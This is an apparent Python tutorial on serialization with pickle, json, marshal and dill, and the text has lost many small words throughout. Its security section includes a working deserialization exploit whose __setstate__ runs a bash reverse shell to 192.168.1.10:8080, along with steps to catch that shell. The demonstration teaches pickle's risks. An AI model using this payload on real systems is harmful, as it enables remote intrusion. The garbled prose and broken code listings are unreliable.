next prev Pickle Module Python developer sometimes want send some complex object commands through network save internal state their objects disk database using later. achieve this, developer serialization process, which supported standard library, cause Python's Pickle Module. this tutorial, will discuss serializing deserializing object which module user should serializing objects python. kind objects serialized using Pickle module python. will also explain Pickle module serializing object hierarchies what risks developer face while deserializing object from untrusted source? Serialization Python process serializing convert data structure into linear form, which stored transmitted through network. Python, serialization allows developer convert complex object structure into stream bytes that saved disk send through network. developer refer this process marshalling. Whereas, Deserialization reverse process serialization which user takes stream bytes transforms into data structure. This process referred unmarshalling. developer serialization many different situations. them saving internal state neural networking after processing training phase that they state later they don't have training again. Python there three modules standard library that allows developer serialize deserialize objects: pickle module marshal module json module Python also supports XML, which developers serializing objects. json Module latest module three. This allows developer work beside standard JSON files. Json most suitable commonly used format data exchange. There numerous reasons choosing JSON format: Human Readable Language Independent Lighter than With json Module, developer serializing deserializing different standard Python types: List dict string tuple bool float None oldest module these three modules marshal module. primary purpose reading writing compiled bytecode Python modules, .pyc files which developer gets when Python module imported interpreter. Therefore, developer marshal module serializing object recommended. pickle module Python another method serializing deserializing objects Python. This different from json module this. object serialized binary format, whose result readable humans. Although, faster than others, work with many other python types, including developer's custom -defined objects. developer many different methods serializing deserializing objects Python. three important guidelines concluding which method suitable developer's case are: marshal module, used mostly interpreter. official documentation warns that maintainers Python modify format backward -incompatible types. json modules safe choices developer wants interoperability with different languages human -readable format. Python pickle module best choice remaining cases. Suppose developer does want human -readable format standard interoperable format. they require serialize custom objects. Then they choose pickle module. Inside pickle Module pickle module python contains four methods: dump( obj, file, protocol None, fix_imports True, buffer_callback None) dumps( obj, protocol None, fix_imports True, buffer_callback None) load( file, fix_imports True, encoding ASCII errors "strict buffers None) loads( bytes_object, fix_imports True, encoding ASCII errors strict buffers None) first methods used pickling process, next methods used unpickling process. difference between dump() dumps() that dump() creates file which contains serialization results, dumps() returns string. differentiation dumps() from dump(), developer remember that dumps() function, s' stands string. same concept applied load() loads() function. load() function used reading file unpickling process, loads() function operates string. Suppose user custom -defined class named forexample_class with many different attributes, each them different types: the_number the_string the_list the_dictionary the_tuple example below explains user instantiate class pickle instance plain string. After pickling class, user modify value attributes without affecting pickled string. User afterward unpickle string which pickled earlier another variable, restore copy pickled class. example: pickle.py import pickle class forexample_class: the_number the_string hello" the_list the_dict first second third the_tuple user_object forexample_class() user_pickled_object pickle.dumps( user_object here, user Pickling object print( This user's pickled object: user_pickled_object user_object.the_dict None user_unpickled_object pickle.loads( user_pickled_object here, user Unpickling object print( This the_dict unpickled object: user_unpickled_object.the_dict Output: This user's pickled object: \x80 \x04 \x95$ \x00 \x00 \x00 \x00 \x00 \x00 \x00 \x8c \x08__main__ \x94 \x8c \x10forexample_class \x94 \x93 \x94) \x81 \x94. This the_dict unpickled object: first second third Example Explanation Here, process pickling ended correctly, stores user's whole instance string: \x80 \x04 \x95$ \x00 \x00 \x00 \x00 \x00 \x00 \x00 \x8c \x08__main__ \x94 \x8c \x10forexample_class \x94 \x93 \x94) \x81 \x94. 'After completing process pickling, user change their original objects making the_dict attribute equals None. Now, user process unpickling string into utterly instance. When user gets deep copy their original object structure from time when process pickling object began. Protocol Formats Pickle Module Python pickle module python -specific, results only readable another python program. Although developer might working with python, they should know that pickle module advanced now. This means that developer pickled object with some specific version python, they might able unpickle object with previous version. compatibility this depends protocol version that developer used while process pickling. There different protocols that Pickle module python use. requirement unpickling most recent python interpreter directly proportional highness protocol version. Protocol version first version. human readable like other protocols Protocol version first binary format. Protocol version introduced Python 2.3. Protocol version added Python 3.0. Python version cannot unpickle Protocol version added Python 3.4. features support wider range object sizes types default protocol starting with Python 3.8. Protocol version added Python 3.8. features support out-of-band dataand improved speeds in-band data. choose specific protocol, developer specify protocol version when they call dump(), dumps(), load() loads() functions. they specify protocol, their interpreter will default version specified pickle.DEFAULT_PROTOCOL attribute. Types Pickleable Unpickleable have already discussed that pickle module python serialize much more types than json module although everything pickleable. list unpickleable objects also contains database connections, running threads, opened network sockets, many others. user stuck with unpickleable objects, then there things they first option they have third -part library, example, dill. dill library extend capabilities pickle. This library user serialize fewer common types such functions with yields, lambdas, nested functions, many more. testing this module, user pickle lambda function. example: pickle_error.py import pickle squaring lambda user_pickle pickle.dumps( squaring user tries this code, they will exception because pickle module python serialize lambda function. Output: PicklingError Traceback (most recent call last) <ipython-input-9-1141f36c69b9> <module> squaring lambda ----> user_pickle pickle.dumps(squaring) PicklingError: Can't pickle <function <lambda> 0x000001F1581DEE50>: attribute lookup <lambda> __main__ failed Now, user replaces pickle module with dill library, they difference. example: pickle_dill.py import dill squaring lambda user_pickle dill.dumps( squaring print( user_pickle After running above program, user that dill library serialized lambda function without error. Output: \x80 \x04 \x95 \xb2 \x00 \x00 \x00 \x00 \x00 \x00 \x00 \x8c \ndill._dill \x94 \x8c \x10_create_function \x94 \x93 \x94 \x00 \x8c \x0c_create_code \x94 \x93 \x94 \x01K \x00K \x00K \x01K \x02KCC \x08| \x00| \x00 \x14 \x00S \x00 \x94N \x85 \x94 \x8c \x01x \x94 \x85 \x94 \x8c \x1f< ipython-input-11-30f1c8d0e50d \x94 \x8c \x08< lambda \x94K \x04C \x00 \x94 )t \x94R \x94c__builtin__ \n__main__ \nh \nNN \x94Nt \x94R \x94. There another interesting feature dill library, such serialize whole interpreter session. example: squaring lambda squaring( import math math.sqrt import dill dill.dump_session( testing.pkl exit() above example, user started interpreter, imported module, then defined lambda function along with other variables. They have then imported dill library called dump_session() function serializing whole session. user code correctly, then they would getting testing.pkl file their current directory. Output: testing.pkl [email protected] dave staff 493 09:52 testing.pkl Now, user start instance interpreter load testing.pkl file resorting their last session. example: globals().items() Output: dict_items( __name__ __main__ __doc__ Automatically created module IPython interactive environment __package__ None __loader__ None __spec__ None __builtin__ module builtins built-in __builtins__ module builtins built-in globals().items() C:\\Users \\User Name \\AppData \\Local \\Programs \\Python \\Python39 \\Scripts globals().items() get_ipython bound method InteractiveShell.get_ipython ipykernel.zmqshell.ZMQInteractiveShell object 0x000001E1CDD8DDC0 exit IPython.core.autocall.ZMQExitAutocall object 0x000001E1CDD9FC70 quit IPython.core.autocall.ZMQExitAutocall object 0x000001E1CDD9FC70 _iii globals().items() import dill dill.load_session( testing.pkl globals().items() Output: dict_items( __name__ __main__ __doc__ Automatically created module IPython interactive environment __package__ None __loader__ None __spec__ None __builtin__ module builtins built-in __builtins__ module builtins built-in squaring lambda \na squaring( \nimport math math.sqrt \nimport dill \ndill.dump_session( testing.pkl \nexit() C:\\ Users\\ User Name \\AppData \\Local \\Programs \\Python \\Python39 \\Scripts squaring lambda squaring( \nimport math\nq math.sqrt \nimport dill \ndill.dump_session( testing.pkl \nexit() get_ipython bound method InteractiveShell.get_ipython ipykernel.zmqshell.ZMQInteractiveShell object 0x000001E1CDD8DDC0 exit IPython.core.autocall.ZMQExitAutocall object 0x000001E1CDD9FC70 quit IPython.core.autocall.ZMQExitAutocall object 0x000001E1CDD9FC70 _iii squaring lambda squaring( \nimport math math.sqrt \nimport dill \ndill.dump_session( testing.pkl \nexit() _1 dict_items( __name__ __main__ __doc__ Automatically created module IPython interactive environment __package__ None __loader__ None __spec__ None __builtin__ module builtins built-in __builtins__ module builtins built-in Output: Output: 22.0 squaring Output: (x)> Here, first globals().item() statement reveals that interpreter initial state, meaning that developer import dill library invoke load_session() restoring their serialized interpreter session. Developers should remember that they using dill library instead pickle module, that standard library does include dill library. slower than pickle module. Dill library serialize wider range objects than pickle module, cannot solve every problem serialization that developer face. developer wants serialize object which contains database connection, then they cannot work with dill library. That unserialized object dill library. solution this problem exclude object during process serialization reinitializing connection after object deserialized. developer _getstate_() defining which objects should included pickling process whatnot. This method allows developer specify what they want pickle. they override _getstate_(), then _dict_() will used, which default instance. following example, user defined class with several attributes then excluded attributes process serialization using _getstate_(). example: custom_pickle.py import pickle class foobar: __init__( self self.p self.q testing self.r lambda __getstate__( self attribute self.__dict__.copy() attribute[ return attribute user_foobar_instance foobar() user_pickle_string pickle.dumps( user_foobar_instance user_new_instance pickle.loads( user_pickle_string print( user_new_instance.__dict__ above example, user created object with three attributes, attributes lambda, which unpickleable object pickle module. solving this issue, they have specified _getstate_() which attribute pickle. user cloned whole _dict_ instance defining attributes class, then they have removed unpickleable attribute 'r'. After running this code then deserializing object, user that instance does contain attribute. Output: {'p': 'q': testing '} user wants additional initialization during process unpickling, such adding excluded attribute back deserialized instance. They this using _setstate_() function. example: custom_unpickle.py import pickle class foobar: __init__( self self.p self.q testing self.r lambda __getstate__( self attribute self.__dict__.copy() attribute[ return attribute __setstate__(self, state): self.__dict__ state self.c lambda user_foobar_instance foobar() user_pickle_string pickle.dumps( user_foobar_instance user_new_instance pickle.loads( user_pickle_string print( user_new_instance.__dict__ Here, bypassing excluded attribute _setstate_(), user ensured that object will appear _dict_ unpickling string. Output: testing function foobar.__setstate__.< locals >.< lambda 0x000001F2CB063700 Compression Pickle Objects pickle data format compact binary representation object structure, still, users optimize their pickle string compressing with bzip2 gzip. compressing pickled string with bzip2, user module, which provided standard library python. example, user taken string will pickle then compress using module. example: import pickle import user_string """Per citt� dolente, l'etterno dolore, tra perduta gente. Giustizia mosse il mio alto fattore: fecemi divina podestate, somma sapienza primo amore; dinanzi fuor cose create etterne, etterno duro. Lasciate ogne speranza, voi ch'intrate.""" pickling pickle.dumps( user_string compressed bz2.compress( pickling len( user_string Output: 312 len( compressed Output: user should remember that smaller files come cost slower process. Security Concerns with Pickle Module Till now, have discussed pickle module serializing deserializing objects Python. process serialization convenient when developer wants save state their objects disk transmit through network. Although, there more thing that developer should know about pickle module python, that very secure. earlier, have discussed _setstate_() function. This method best performing more initialization along with unpickling process. Still, also used executing arbitrary code during unpickling process. There nothing much developer reduce risk. basic rule developer should never unpickle data which comes from untrusted source transmitted through insecure network. preventing attacks, user libraries like hmac signing data making sure that been tampered with. example: unpickling tampered pickle expose system user attackers. remote.py import pickle import class foobar: __init__( self pass __getstate__( self return self.__dict__ __setstate__( self, state attack from 192.168.1.10 attacker listening port 8080 os.system('/bin/bash "/bin/bash >& /dev/tcp/192.168.1.10/8080 0>&1"') user_foobar foobar() user_pickle pickle.dumps( user_foobar user_unpickle pickle.loads( user_pickle Example above example, process unpickling executed _setstate_(), which will execute Bash command opening remote shell 192.168.1.10 system port 8080. This user safely test scrip their Linux box. First, they have open terminal then command listing connection port 8080. example: 8080 This terminal will attackers. Then, user open another terminal same computer system execute python code unpicking malicious code. user make sure that they have change address code address their attacking terminal. After executing code, shell exposed attackers. remote.py Now, bash shell will visible attacking console. This console operated directly now, system which attacked. example: 8080 Output: bash: control this shell default interactive shell zsh. update your account zsh, please chsh /bin /zsh`. more details, please visit https://support.apple.com /kb /HT208060. bash-3.1$ Conclusion: This article discussed serialize deserialize objects using different modules python pickle module better than others. have also explained some objects cannot unpickled avoid problems created them. Next TopicHow convert Bytes string Python prev next